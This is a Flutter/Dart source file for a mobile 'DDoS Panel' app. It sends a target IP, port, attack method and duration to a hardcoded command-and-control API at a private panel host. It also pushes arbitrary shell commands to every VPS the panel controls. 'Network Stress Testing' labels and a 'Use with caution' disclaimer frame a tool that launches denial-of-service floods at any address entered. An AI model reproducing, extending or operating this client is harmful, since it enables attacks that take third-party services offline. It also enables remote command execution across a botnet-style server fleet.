import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:math' as math;
import 'dart:ui';
import 'manage_server.dart'; // Pastikan file ini ada

class AttackPanel extends StatefulWidget {
  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;
  final List<Map<String, dynamic>> listDDoS;

  const AttackPanel({
    super.key,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    required this.sessionKey,
    required this.listDDoS,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  // Controllers
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final commandController = TextEditingController();

  // Constants & Theme Colors (Dark Red Theme)
  static const String baseUrl = "http://rixzz-privat-panel.sano.biz.id:11490/api/vps";
  static const Color primaryRed = Color(0xFFD32F2F); // Merah terang untuk aksen
  static const Color darkRed = Color(0xFF8B0000);    // Merah tua untuk border/bg
  static const Color bgBlack = Colors.black;
  static const Color glassColor = Color(0xFF1A0505); // Hitam kemerahan transparan

  // State variables
  late AnimationController _controller;
  late AnimationController _speedDialController;
  late Animation<double> _fadeAnimation;
  late Animation<double> _rotateAnimation;
  String selectedDoosId = "";
  double attackDuration = 60;
  bool isExecuting = false;
  bool isCommandExecuting = false;
  bool _isSpeedDialOpen = false;

  @override
  void initState() {
    super.initState();
    _initializeAnimation();
    _initializeSpeedDialAnimation();
    _setDefaultDoos();
  }

  void _initializeAnimation() {
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    );
    _fadeAnimation = Tween<double>(begin: 0.7, end: 1.0).animate(
      CurvedAnimation(parent: _controller, curve: Curves.easeInOut),
    );
    _controller.repeat(reverse: true);
  }

  void _initializeSpeedDialAnimation() {
    _speedDialController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 250),
    );
    _rotateAnimation = Tween<double>(begin: 0.0, end: 0.75).animate(_speedDialController);
  }

  void _setDefaultDoos() {
    if (widget.listDDoS.isNotEmpty) {
      selectedDoosId = widget.listDDoS[0]['ddos_id'];
    }
  }

  void _toggleSpeedDial() {
    setState(() {
      _isSpeedDialOpen = !_isSpeedDialOpen;
      if (_isSpeedDialOpen) {
        _speedDialController.forward();
      } else {
        _speedDialController.reverse();
      }
    });
  }

  // --- LOGIC FUNCTIONS (Sama seperti sebelumnya) ---

  Future<void> _sendDoos() async {
    if (isExecuting) return;
    setState(() => isExecuting = true);

    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (!_validateInputs(target, port)) {
      setState(() => isExecuting = false);
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      _handleResponse(data, target);
    } catch (_) {
      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
    } finally {
      setState(() => isExecuting = false);
    }
  }

  Future<void> _sendCommand() async {
    if (isCommandExecuting) return;
    final command = commandController.text.trim();
    if (command.isEmpty) {
      _showAlert("❌ Error", "Command cannot be empty.");
      return;
    }

    setState(() => isCommandExecuting = true);
    try {
      final uri = Uri.parse("$baseUrl/sendCommand");
      final res = await http.post(
        uri,
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"key": widget.sessionKey, "command": command}),
      );
      final data = jsonDecode(res.body);

      if (data["success"] == true) {
        Navigator.pop(context);
        _showCommandNotification("Command sent successfully!");
        _showAlert("✅ Success", "Command sent to all VPS servers.");
      } else {
        _showAlert("❌ Failed", data["error"] ?? "Failed to send command.");
      }
    } catch (_) {
      _showAlert("❌ Error", "An unexpected error occurred.");
    } finally {
      setState(() => isCommandExecuting = false);
    }
  }

  void _showCommandNotification(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.check_circle, color: Colors.white),
            const SizedBox(width: 8),
            Expanded(child: Text(message, style: const TextStyle(color: Colors.white))),
          ],
        ),
        backgroundColor: darkRed,
        duration: const Duration(seconds: 3),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      ),
    );
  }

  bool _validateInputs(String target, String port) {
    if (target.isEmpty || widget.sessionKey.isEmpty) {
      _showAlert("❌ Invalid Input", "Target IP cannot be empty.");
      return false;
    }
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    if (!isIcmp && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("❌ Invalid Port", "Please input a valid port.");
      return false;
    }
    return true;
  }

  void _handleResponse(Map<String, dynamic> data, String target) {
    if (data["success"] == true) {
      _showAlert("✅ Success", "Attack sent to $target.");
    } else if (data["error"] != null) {
      _showAlert("❌ Error", data["error"]);
    } else {
      _showAlert("⚠️ Unknown", "Unknown response.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: glassColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(color: primaryRed.withOpacity(0.5), width: 1),
        ),
        title: Text(title, style: const TextStyle(color: primaryRed, fontFamily: 'Orbitron')),
        content: Text(msg, style: const TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: primaryRed)),
          )
        ],
      ),
    );
  }

  void _showCommandDialog() {
    _toggleSpeedDial();
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: glassColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(color: primaryRed.withOpacity(0.5), width: 1),
        ),
        title: const Text("Send Command", style: TextStyle(color: primaryRed, fontFamily: 'Orbitron')),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Text("Execute command on all VPS:", style: TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono')),
            const SizedBox(height: 16),
            TextField(
              controller: commandController,
              style: const TextStyle(color: primaryRed),
              cursorColor: primaryRed,
              maxLines: 3,
              decoration: _inputStyle("e.g. apt update -y"),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: isCommandExecuting ? null : () => Navigator.pop(context),
            child: const Text("Cancel", style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: isCommandExecuting ? null : _sendCommand,
            style: ElevatedButton.styleFrom(backgroundColor: primaryRed),
            child: isCommandExecuting
                ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                : const Text("Send", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  void _navigateToManageServer() {
    _toggleSpeedDial();
    Navigator.push(
      context,
      MaterialPageRoute(builder: (context) => ManageServerPage(sessionKey: widget.sessionKey)),
    );
  }

  // --- UI WIDGETS ---

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";

    return Scaffold(
      backgroundColor: bgBlack,
      body: Stack(
        children: [
          // 1. Starry Background
          const Positioned.fill(child: StarField()),

          // 2. Main Content
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              physics: const BouncingScrollPhysics(),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _buildHeaderNew(),
                  const SizedBox(height: 24),
                  _buildTargetSection(isIcmp),
                  const SizedBox(height: 20),
                  _buildAttackSection(),
                  const SizedBox(height: 24),
                  _buildExecuteButton(),
                  const SizedBox(height: 12),
                  _buildDisclaimer(),
                  const SizedBox(height: 80), // Space for FAB
                ],
              ),
            ),
          ),

          // 3. Speed Dial Backdrop
          if (_isSpeedDialOpen)
            Positioned.fill(
              child: GestureDetector(
                onTap: _toggleSpeedDial,
                child: Container(color: Colors.black.withOpacity(0.7)),
              ),
            ),

          // 4. Speed Dial Buttons
          Positioned(
            bottom: 24, // Changed to bottom for better UX on mobile
            right: 16,
            child: _buildSpeedDial(),
          ),
        ],
      ),
    );
  }

  Widget _buildHeaderNew() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: glassColor.withOpacity(0.8),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: darkRed.withOpacity(0.8), width: 1.5),
        boxShadow: [
          BoxShadow(
            color: primaryRed.withOpacity(0.1),
            blurRadius: 15,
            spreadRadius: 2,
          ),
        ],
      ),
      child: Column(
        children: [
          // Icon Server + Lightning
          SizedBox(
            height: 80,
            width: 80,
            child: Stack(
              alignment: Alignment.center,
              children: [
                const Icon(Icons.dns, size: 50, color: Colors.white24), // Background shadow icon
                const Icon(Icons.dns_outlined, size: 50, color: primaryRed),
                Positioned(
                  top: 0,
                  right: 0,
                  child: Container(
                    decoration: BoxDecoration(
                      color: bgBlack,
                      shape: BoxShape.circle,
                      boxShadow: [BoxShadow(color: primaryRed.withOpacity(0.5), blurRadius: 10)],
                    ),
                    child: const Icon(Icons.bolt, size: 35, color: Colors.yellowAccent),
                  ),
                ),
              ],
            ),
          ),
          const SizedBox(height: 12),
          
          // Titles
          const Text(
            "DDoS Panel",
            style: TextStyle(
              color: primaryRed,
              fontFamily: 'Orbitron',
              fontSize: 24,
              fontWeight: FontWeight.bold,
              shadows: [Shadow(color: darkRed, blurRadius: 10)],
            ),
          ),
          const SizedBox(height: 4),
          Text(
            "Advanced Network Stress Testing",
            style: TextStyle(
              color: Colors.white.withOpacity(0.5),
              fontFamily: 'ShareTechMono',
              fontSize: 12,
            ),
          ),
          
          const SizedBox(height: 16),
          // Divider Line
          Divider(color: primaryRed.withOpacity(0.3), thickness: 1),
          const SizedBox(height: 16),

          // User Profile Section
          Row(
            children: [
              // Profile Picture
              Container(
                width: 60,
                height: 60,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(color: primaryRed, width: 2),
                  image: const DecorationImage(
                    image: AssetImage('assets/images/ddospp.jpg'),
                    fit: BoxFit.cover,
                  ),
                  boxShadow: [BoxShadow(color: primaryRed.withOpacity(0.3), blurRadius: 8)],
                ),
              ),
              const SizedBox(width: 16),
              
              // Username & Info
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      widget.username,
                      style: const TextStyle(
                        color: Colors.white,
                        fontFamily: 'Orbitron',
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 8),
                    Row(
                      children: [
                        _buildInfoLabel(Icons.timer, widget.expiredDate),
                        const SizedBox(width: 8),
                        _buildInfoLabel(Icons.admin_panel_settings, widget.role),
                      ],
                    ),
                  ],
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildInfoLabel(IconData icon, String text) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
      decoration: BoxDecoration(
        color: primaryRed.withOpacity(0.15),
        borderRadius: BorderRadius.circular(6),
        border: Border.all(color: primaryRed.withOpacity(0.3)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, size: 12, color: primaryRed),
          const SizedBox(width: 4),
          Text(
            text,
            style: const TextStyle(
              color: Colors.white70,
              fontFamily: 'ShareTechMono',
              fontSize: 11,
              fontWeight: FontWeight.bold,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTargetSection(bool isIcmp) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildSectionTitle("Target Configuration"),
        const SizedBox(height: 12),
        _buildInputCard(
          icon: Icons.my_location, // Changed icon
          title: "Target IP",
          child: TextField(
            controller: targetController,
            style: const TextStyle(color: primaryRed, fontFamily: 'ShareTechMono'),
            cursorColor: primaryRed,
            decoration: _inputStyle("Enter target IP (e.g. 1.1.1.1)"),
          ),
        ),
        const SizedBox(height: 12),
        _buildInputCard(
          icon: Icons.numbers,
          title: "Port",
          child: TextField(
            controller: portController,
            enabled: !isIcmp,
            keyboardType: TextInputType.number,
            style: TextStyle(color: isIcmp ? Colors.grey : primaryRed, fontFamily: 'ShareTechMono'),
            decoration: _inputStyle(
              isIcmp ? "ICMP (No Port)" : "Enter port (e.g. 80)",
              isIcmp: isIcmp,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildAttackSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        _buildSectionTitle("Attack Configuration"),
        const SizedBox(height: 12),
        _buildDurationCard(),
        const SizedBox(height: 12),
        _buildMethodCard(),
      ],
    );
  }

  Widget _buildDurationCard() {
    return _buildInputCard(
      icon: Icons.timer_outlined,
      title: "Duration",
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(
                "${attackDuration.toInt()}s",
                style: const TextStyle(color: primaryRed, fontSize: 18, fontWeight: FontWeight.bold, fontFamily: 'Orbitron'),
              ),
              Text(
                "${(attackDuration / 60).toStringAsFixed(1)} min",
                style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 12),
              ),
            ],
          ),
          SliderTheme(
            data: SliderTheme.of(context).copyWith(
              activeTrackColor: primaryRed,
              inactiveTrackColor: primaryRed.withOpacity(0.2),
              thumbColor: Colors.white,
              overlayColor: primaryRed.withOpacity(0.2),
              thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 8),
              trackHeight: 2,
            ),
            child: Slider(
              value: attackDuration,
              min: 10,
              max: 300,
              divisions: 29,
              onChanged: (value) => setState(() => attackDuration = value),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMethodCard() {
    return _buildInputCard(
      icon: Icons.bolt,
      title: "Attack Method",
      child: DropdownButtonHideUnderline(
        child: DropdownButton<String>(
          dropdownColor: const Color(0xFF1A0505),
          value: selectedDoosId,
          isExpanded: true,
          iconEnabledColor: primaryRed,
          style: const TextStyle(color: primaryRed, fontFamily: 'ShareTechMono'),
          items: widget.listDDoS.map((doos) {
            return DropdownMenuItem<String>(
              value: doos['ddos_id'],
              child: Text(doos['ddos_name']),
            );
          }).toList(),
          onChanged: (value) => setState(() => selectedDoosId = value!),
        ),
      ),
    );
  }

  Widget _buildExecuteButton() {
    return Container(
      width: double.infinity,
      decoration: BoxDecoration(
        boxShadow: [
          if (!isExecuting)
            BoxShadow(color: primaryRed.withOpacity(0.4), blurRadius: 15, spreadRadius: 1)
        ],
      ),
      child: ElevatedButton.icon(
        onPressed: isExecuting ? null : _sendDoos,
        icon: isExecuting
            ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
            : const Icon(Icons.rocket_launch, color: Colors.white),
        label: Text(
          isExecuting ? "INITIALIZING..." : "LAUNCH ATTACK",
          style: const TextStyle(
            fontSize: 16,
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            letterSpacing: 2,
            color: Colors.white,
          ),
        ),
        style: ElevatedButton.styleFrom(
          backgroundColor: primaryRed,
          padding: const EdgeInsets.symmetric(vertical: 16),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
          elevation: 0,
        ),
      ),
    );
  }

  Widget _buildSpeedDial() {
    return Column(
      mainAxisSize: MainAxisSize.min,
      crossAxisAlignment: CrossAxisAlignment.end,
      children: [
        _buildSpeedDialChild(Icons.dns, "Manage Server", _navigateToManageServer),
        const SizedBox(height: 12),
        _buildSpeedDialChild(Icons.terminal, "Send Command", _showCommandDialog),
        const SizedBox(height: 12),
        FloatingActionButton(
          onPressed: _toggleSpeedDial,
          backgroundColor: primaryRed,
          child: AnimatedBuilder(
            animation: _rotateAnimation,
            builder: (ctx, child) => Transform.rotate(
              angle: _rotateAnimation.value,
              child: const Icon(Icons.add, color: Colors.white),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSpeedDialChild(IconData icon, String label, VoidCallback onTap) {
    return AnimatedOpacity(
      opacity: _isSpeedDialOpen ? 1.0 : 0.0,
      duration: const Duration(milliseconds: 200),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: Colors.black87,
              borderRadius: BorderRadius.circular(4),
              border: Border.all(color: primaryRed.withOpacity(0.3)),
            ),
            child: Text(label, style: const TextStyle(color: Colors.white, fontSize: 12)),
          ),
          const SizedBox(width: 8),
          FloatingActionButton.small(
            onPressed: onTap,
            backgroundColor: darkRed,
            heroTag: null,
            child: Icon(icon, color: Colors.white),
          ),
        ],
      ),
    );
  }

  Widget _buildSectionTitle(String title) {
    return Padding(
      padding: const EdgeInsets.only(left: 4),
      child: Text(
        title.toUpperCase(),
        style: TextStyle(
          color: primaryRed.withOpacity(0.8),
          fontFamily: 'Orbitron',
          fontSize: 12,
          fontWeight: FontWeight.bold,
          letterSpacing: 1.5,
        ),
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: glassColor.withOpacity(0.6),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: primaryRed.withOpacity(0.2)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: primaryRed, size: 20),
              const SizedBox(width: 10),
              Text(
                title,
                style: const TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                  fontSize: 14,
                ),
              ),
            ],
          ),
          Divider(color: primaryRed.withOpacity(0.1), height: 20),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(
        color: isIcmp ? Colors.grey : Colors.white24,
        fontFamily: 'ShareTechMono',
        fontSize: 14,
      ),
      filled: true,
      fillColor: Colors.black.withOpacity(0.3),
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : primaryRed.withOpacity(0.3)),
        borderRadius: BorderRadius.circular(8),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: const BorderSide(color: primaryRed),
        borderRadius: BorderRadius.circular(8),
      ),
    );
  }

  Widget _buildDisclaimer() {
    return Center(
      child: Text(
        "Use with caution. System monitored.",
        style: TextStyle(
          color: Colors.red.withOpacity(0.4),
          fontSize: 10,
          fontFamily: 'ShareTechMono',
        ),
        textAlign: TextAlign.center,
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    _speedDialController.dispose();
    targetController.dispose();
    portController.dispose();
    commandController.dispose();
    super.dispose();
  }
}

// --- STARRY BACKGROUND ANIMATION ---
class StarField extends StatefulWidget {
  const StarField({super.key});
  @override
  _StarFieldState createState() => _StarFieldState();
}

class _StarFieldState extends State<StarField> with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  final List<Star> _stars = [];

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(vsync: this, duration: const Duration(seconds: 10))..repeat();
    for (int i = 0; i < 100; i++) {
      _stars.add(Star());
    }
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _controller,
      builder: (context, child) {
        return CustomPaint(
          painter: StarPainter(_stars, _controller.value),
          size: Size.infinite,
        );
      },
    );
  }
}

class Star {
  double x = math.Random().nextDouble();
  double y = math.Random().nextDouble();
  double size = math.Random().nextDouble() * 2 + 0.5;
  double opacity = math.Random().nextDouble();
}

class StarPainter extends CustomPainter {
  final List<Star> stars;
  final double progress;

  StarPainter(this.stars, this.progress);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Colors.white;
    for (var star in stars) {
      // Simple twinkling effect
      double opacity = (math.sin((progress * 10) + star.x * 10) + 1) / 2;
      paint.color = Colors.white.withOpacity(opacity * 0.8);
      
      // Slight movement
      double dy = (star.y + progress * 0.1) % 1.0;
      
      canvas.drawCircle(
        Offset(star.x * size.width, dy * size.height),
        star.size,
        paint,
      );
    }
  }

  @override
  bool shouldRepaint(CustomPainter oldDelegate) => true;
}

